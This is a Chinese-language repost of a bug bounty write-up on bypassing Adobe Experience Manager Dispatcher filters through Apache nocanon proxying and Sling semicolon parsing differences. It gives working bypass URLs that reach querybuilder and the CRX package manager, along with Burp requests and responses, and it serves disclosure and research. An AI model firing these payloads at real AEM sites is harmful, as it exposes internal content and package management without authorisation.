#  Adobe Experience Manager (AEM) Dispatcher 绕过完全指南 ($10,000+ 赏金)  
muhammadwaseem29
                    muhammadwaseem29  赛博知识驿站   2026-05-11 02:00  
  
   
  
在企业级 Web 架构的隐秘角落，总有一些容易被忽视的致命盲区。安全研究员 **Muhammad Waseem**  
 近日凭借对 **Adobe Experience Manager (AEM) Dispatcher 绕过技术**  
的深度挖掘，揽获了超万美元的丰厚赏金。这不只是运气的眷顾，更是对底层逻辑抽丝剥茧的必然结果。  
  
让我们一探究竟。  
### 01 研究的火花  
  
一切的起因，源于 Twitter 上一条看似寻常的推文。安全大牛 **Shubham Shah (infosec_au)**  
 演示了如何绕过 Adobe AEM Dispatcher，这条动态犹如一颗石子，激起了千层浪。  
  
https://x.com/infosec_au/status/1977916711295709253  
  
![Twitter研究推文](https://mmbiz.qpic.cn/sz_mmbiz_png/lWEOEB1GOU3cJ0IcU151Cm75ZMxtp5tmQGXwc8QJbFYYicshXKTbiawmfaZicEdz0DrNMibOoY5nOp6OfwYfr4TA1wf6wT5icWiaPCMAkWBDe2rL8/640?wx_fmt=png&from=appmsg "")  
  
Twitter研究推文  
  
推文附带的 SLCyber 研究中心链接，更是提供了关于 AEM 漏洞的硬核技术洞察：  
  
https://slcyber.io/research-center/finding-critical-bugs-in-adobe-experience-manager/  
  
![SLCyber研究文章](https://mmbiz.qpic.cn/sz_mmbiz_png/lWEOEB1GOU1OgSlXvYibPlPyZr4emFpdgrjt8K3IpgW6iaaUeA6KGNx5T1w9jyvicFn8zF5cKiaDeneUKabqWwOVMDbxXQdY2HicBvtNcwVYhJcE/640?wx_fmt=png&from=appmsg "")  
  
SLCyber研究文章  
### 02 剖析基石  
  
“Adobe Experience Manager 是当下最流行的内容管理系统之一。鉴于它在企业界的广泛应用，你几乎每天都在与基于 AEM 的站点打交道。”  
  
读完这番话，Waseem 开始将这些关键洞察与现代漏洞狩猎的实战逻辑相融合。  
### 03 AEM 端点的核心命门  
  
AEM 的核心暴露了大量端点，这些端口往往会泄露站点的结构信息。其中最著名的诸如 /bin/querybuilder.json  
，它允许查询应用内所有的“节点”（页面内容）。  
  
显然，作为一个运行 AEM 的站点，绝不愿意将这些仅供内部作者使用的功能毫无防备地暴露给公众。事实也的确如此，在一个配置得当的 AEM 站点上直接访问 /bin/querybuilder.json  
，必然会被拦截。  
  
![AEM查询构建器端点](https://mmbiz.qpic.cn/mmbiz_png/lWEOEB1GOU02Cnm4hnYMRxmsZVsEib4gjpr9okq2DEUmWOW0WWZibN0R7VNmicv4luiawJriaELTLVaZ9Tl64WDFPc9rl5Z6QiaFwTMiaLG7nMDInw/640?wx_fmt=png&from=appmsg "")  
  
AEM查询构建器端点  
### 04 标准 Dispatcher 配置  
  
审视标准的云 AEM Dispatcher 配置，其策略堪称“铁桶阵”：默认拒绝一切请求，仅对客户需要的内容放行。  
  
dispatcher.conf  
```
# deny everything and allow specific entries
/0001 { /type "deny"  /url "*" }# This rule allows content to be access
/0010 { /type "allow" /extension '(css|eot|gif|ico|jpeg|jpg|js|gif|pdf|png|svg|swf|ttf|woff|woff2|html|mp4|mov|m4v)' /path "/content/*" }# Enable specific mime types in non-public content directories
/0011 { /type "allow" /method "GET" /extension '(css|eot|gif|ico|jpeg|jpg|js|gif|png|svg|swf|ttf|woff|woff2)' }# Enable clientlibs proxy servlet
/0012 { /type "allow" /method "GET" /url "/etc.clientlibs/*" }
```  
### 05 Dispatcher 绕过 #1：Apache vs Jetty  
  
Adobe 提供了两种实现 Dispatcher 的方式：通过 Apache 配置和模块（disp_apache2.so  
），或是通过 IIS 模块。鉴于 Apache 的普及度，研究自然聚焦于此。  
  
然而，就在默认的 Apache 配置中，研究者发现了破绽：某些路径通过 ProxyPassMatch  
 直接将请求转发给 AEM 主机，完全绕过了 Dispatcher 的规则集。  
  
httpd.conf  
```
# Prevent rewrites and filtering of Delivery API URLs<LocationMatch "^/adobe/dynamicmedia/deliver/.*">    ProxyPassMatch http://${AEM_HOST}:${AEM_PORT}    RewriteEngine Off</LocationMatch># SITES-11040 Do ProxyPassMatch, if caching for GraphQL is not enabled<LocationMatch "/graphql/execute.json/.*">    ProxyPassMatch http://${AEM_HOST}:${AEM_PORT} nocanon</LocationMatch>
```  
  
本能的直觉让人想到路径遍历的惯用伎俩。AEM 主机常运行在 **Jetty**  
 之上，而在历史版本中，..;/  
 曾是路径遍历的利器。  
  
/adobe/dynamicmedia/deliver/..;/..;/..;/bin/querybuilder.json  
  
现实是残酷的——现代 Jetty 早已修补了这一弱点，阻断了 ..;/  
 序列。此路不通。  
### 06 nocanon 的威力  
  
审视下一个 LocationMatch  
 则有趣得多。与前者不同，这条规则使用了 nocanon  
 关键字。  
#### 什么是 nocanon？  
  
“通常情况下，mod_proxy  
 会对代理的 URL 进行规范化处理。但这可能与某些后端产生摩擦，尤其是那些使用 PATH_INFO  
 的后端。可选的 nocanon  
 关键字抑制了这一行为，将原始的、未规范化的 URL 路径直接传递给后端。”  
### 07 执行 nocanon 绕过  
  
Apache 通常会在检查匹配前对 URL 进行规范化。但有了 nocanon  
，代理直接将未经处理的原始 URL 放行。尝试如下载荷：  
  
/graphql/execute.json/..%2f../bin/querybuilder.json  
  
**竟然成功了！**  
 Apache 因为原始 URL 包含正则 /graphql/execute.json/.*  
 而放行；而在后端，Jetty 却将其规范化为 /bin/querybuilder.json  
 再传递给 AEM。一记漂亮的暗度陈仓！  
  
![nocanon绕过逻辑](https://mmbiz.qpic.cn/sz_mmbiz_png/lWEOEB1GOU2m9TN4ibwYMAPOpfEuvZzmiaC47WfiaOB9crI8I15FT3z1X9ZRp8DtphrDx0mJ4ub41Qiaexs3IP1GuQRibc4o3fpGrum2Kp1rua6M/640?wx_fmt=png&from=appmsg "")  
  
nocanon绕过逻辑  
### 08 Apache Sling – URL 分解  
  
为了寻找更多绕过手法，必须深入 AEM 依赖的底层框架 **Apache Sling**  
。Sling 将 URL 拆解为五个组件：**资源路径**  
、**选择器**  
、**扩展名**  
、**路径参数**  
 和 **后缀**  
。  
  
![Sling URL结构](https://mmbiz.qpic.cn/mmbiz_png/lWEOEB1GOU2HnNjXhEnTN4O4cMjT3fUUNBd92iaj7FiaBZNhhqstXnHkiblfXo3XFLP2E0gBcHNQGEX16htcIdf9dxFL1kTT0Xib25Y3libqdfcc/640?wx_fmt=png&from=appmsg "")  
  
Sling URL结构  
### 09 解析差异  
  
攻防博弈的精髓，在于寻找解析差异。试看如下 URL：/bin/querybuilder.tiny.json;x='hello'/extra  
- • **资源路径:**  
 /bin/querybuilder  
  
- • **选择器:**  
 tiny  
  
- • **扩展名:**  
 json  
  
- • **路径参数:**  
 ;x='hello'  
  
- • **后缀:**  
 /extra  
  
Dispatcher 实现了独立的解析器。如果 Dispatcher 与 Sling 对 URL 的解析存在差异，绕过便如探囊取物。  
### 10 Dispatcher 绕过 #2：分号的秘密  
  
通过 Ghidra 逆向分析 Dispatcher 的 decompose_url  
 函数，Waseem 发现了一个令人惊叹的盲点：**它压根不处理路径参数！**  
 在 Dispatcher 眼里，分号 ;  
 只是个普通字符。  
  
Ghidra: decompose_url 分析  
```
void decompose_url(char *uri,char **path,char **selectors,char **extension,char **suffix) {  // ...  if (pcVar2 != (char *)0x0) {
    *pcVar2 = '';    *suffix = strdup(pcVar2);  }}
```  
  
利用这个盲点藏匿恶意载荷，易如反掌。例如：  
  
/bin/querybuilder.json;x='a/b.css/c'  
  
Dispatcher 看到白名单中的 .css  
 扩展名便大开绿灯，而 Sling 却将其解析为对 /bin/querybuilder  
 的带参调用。这套瞒天过海的戏法，堪称惊艳。  
### 11 Dispatcher 绕过 2.5：混合双打  
  
Apache 的 LocationMatch  
 正则常常是未锚定的（缺少 ^  
 和 $  
），这意味着匹配可以发生在字符串的任何位置。  
  
/bin/querybuilder.json;x='x/graphql/execute.json/x'  
  
这种混合绕过，在 WAF 严防死守 ..%2f..  
 的场景下，往往能奇效制胜。  
## 走向实战利用  
### 18 侦察探测  
  
Waseem 借助 **Wappalyzer**  
 浏览器扩展，敏锐地识别出哪些企业正在使用 Adobe Experience Manager。  
  
![Wappalyzer检测](https://mmbiz.qpic.cn/mmbiz_png/lWEOEB1GOU1eib2RFEwQ7kiakz617e9ZI9Ox7eaBednO87rctkHw3hBjibLV4rLa6WZMNcXKOTkSSIZpPBgUC9EYBpltDVuOp7ll10GEibga6DA/640?wx_fmt=png&from=appmsg "")  
  
Wappalyzer检测  
### 19 锁定目标  
  
在 Bugcrowd 上狩猎时，他注意到一个运行 AEM 的高价值目标，随即展开探索。  
  
![目标识别](https://mmbiz.qpic.cn/sz_mmbiz_png/lWEOEB1GOU3ibLvDLemPEXIWzQYr0BviaqsIek2gcp7mYwnrSKIMrxPP8ONyFmDdH4HwgMeLn0OrBPd1Ja93gSgUkH0AezBTcmVFMGVXssUjY/640?wx_fmt=png&from=appmsg "")  
  
目标识别  
### 21 初始试探  
  
他发送了初始请求，直接探测查询构建器端点。  
  
Burp Suite 请求  
```
GET /graphql/execute.json/bin/querybuilder.json HTTP/2Host: target.comUser-Agent: Mozilla/5.0 ...
```  
  
返回结果：HTTP/2 404 Not Found  
。初次尝试碰了壁。  
  
![404响应](https://mmbiz.qpic.cn/mmbiz_png/lWEOEB1GOU3HphkTJ4O84BGDTuIRBJPtWR9ZhP43ia0KYAXQlqap417Bh2aFzf1LWAj2UduQL9WUEfQYciabygtSEbJEL8ibcib31jrvwN0MtRI/640?wx_fmt=png&from=appmsg "")  
  
404响应  
### 22 成功突破  
  
随后，他换上 nocanon  
 绕过利器，附加编码遍历：  
  
绕过请求  
```
GET /graphql/execute.json/..%2f../bin/querybuilder.json HTTP/2
```  
  
**返回结果：**  
```
{"success":true,"results":0,"total":0,"more":false,"offset":0,"hits":[]}
```  
  
这是一个极具价值的正向信号，防线轰然崩塌。  
  
![200 OK响应](https://mmbiz.qpic.cn/mmbiz_png/lWEOEB1GOU2ibl61bQk37sia45us7uwQYoAq4Uyb0xVRSsaaJzGaQhaWVGQEu2iaibbvOf7LZW3fOXSdMbTk3VlghCy40T9rXvyyLLlNP9xoyaQ/640?wx_fmt=png&from=appmsg "")  
  
200 OK响应  
### 23 路径发现  
  
他迅速挖掘出 AEM 的十大敏感路径，锁定了关键端点：  
- • crx/packmgr/service.jsp  
  
- • apps.2.json  
  
- • crx/packmgr/service.jsp?cmd=ls&limit=10000  
  
### 24 绕过包管理器  
  
他尝试访问包管理器。直接访问被拦截，但绕过手法让其无所遁形：  
  
/graphql/execute.json/..%2F../crx/packmgr/service.jsp  
  
**结果：**  
 放行！他成功窥见了系统命令的运作方式。  
  
![未授权的包管理器访问](https://mmbiz.qpic.cn/sz_mmbiz_png/lWEOEB1GOU0PBEhC5CEk3ZGibBiadRLjiaHicd7rWoPdMSibZky7xVuH3o6o6y5xUGUicj3JggR5VebRe5uhMGoplk8t8zrqr6snPZqoUN25znGFw/640?wx_fmt=png&from=appmsg "")  
  
未授权的包管理器访问  
### 26 列出包与影响评估  
  
他执行 ls  
 命令，列出了系统上的所有包：  
  
/graphql/execute.json/..%2f../crx/packmgr/service.jsp?cmd=ls&limit=10000  
  
该漏洞暴露了系统的潜在弱点，可能导致严重的安全风险。这一结果足以向赏金项目证明其致命影响。  
  
![包列表影响](https://mmbiz.qpic.cn/sz_mmbiz_png/lWEOEB1GOU0VzFZkrQhWicBtTSLl6QdmHjxAopyQFicGUv89eeibk82dR9gQRcg6LmbWWIt6me2ZibgKrsMc0ib5IWtNXYknvqCht57FbUHB901I/640?wx_fmt=png&from=appmsg "")  
  
包列表影响  
### 提交与赏金  
  
Waseem 将这些发现在 **Bugcrowd**  
 和 **HackerOne**  
 的多个项目中提交。  
  
Bugcrowd 提交与支付  
  
![Bugcrowd提交](https://mmbiz.qpic.cn/sz_mmbiz_png/lWEOEB1GOU1Fr7wH1uDLsBEzrCjjTEbJddgxs10I9QWs4rDs0yeV4stibNUQ1CHzO2cVXHeWf3v1Yc382Mnuxms7uj93PHn3OrLDDS8M7dUY/640?wx_fmt=png&from=appmsg "")  
  
Bugcrowd提交  
  
![Bugcrowd支付](https://mmbiz.qpic.cn/mmbiz_png/lWEOEB1GOU1yQGynWUqQvW4EOyePNZprZnGHW4iaU1gZHubsz1vv8wvjBNia703An8sczVBxOW1odw4wv9icdZb6jZUZMbkfT1bgfAibMkE1fZg/640?wx_fmt=png&from=appmsg "")  
  
Bugcrowd支付  
  
HackerOne 报告（相同结果）  
  
![HackerOne证据1](https://mmbiz.qpic.cn/sz_mmbiz_png/lWEOEB1GOU1vXIF96GIcA43XONJeZFLq3F8A28KIUrrx2BpO1slVbjpQibCvKxfvibFhFxnn50tLK1BnIwhRmcOrEr4JhaS9P2AIhibesua33E/640?wx_fmt=png&from=appmsg "")  
  
HackerOne证据1  
  
![HackerOne证据2](https://mmbiz.qpic.cn/mmbiz_png/lWEOEB1GOU104jqk3nfZricWI0JH6y6VFCQBEZc688MsrA3VHcxpWNt9gI0VCfTbOJ3x1pxXic036f2fHj0mKBsKMRlOibvjzfRPvVz4kpPwBs/640?wx_fmt=png&from=appmsg "")  
  
HackerOne证据2  
  
![HackerOne证据3](https://mmbiz.qpic.cn/sz_mmbiz_png/lWEOEB1GOU1gb9k49sPgNmqZYhbx0MF4s3aF4uvHyC1v64dTFAXTQKF5DfxBdmutC7wEjIiaC7hA4ibwPDOZkVTwOQTkECjTgWMthNBJBp418/640?wx_fmt=png&from=appmsg "")  
  
HackerOne证据3  
  
这就是全部！这些正是 Waseem 对 AEM 安全的深度洞察。  
  
希望这篇文章能为你带来启发。  
> 原文:https://www.muhammadwaseem29.tech/blog/aem  
  
  
   
  
  
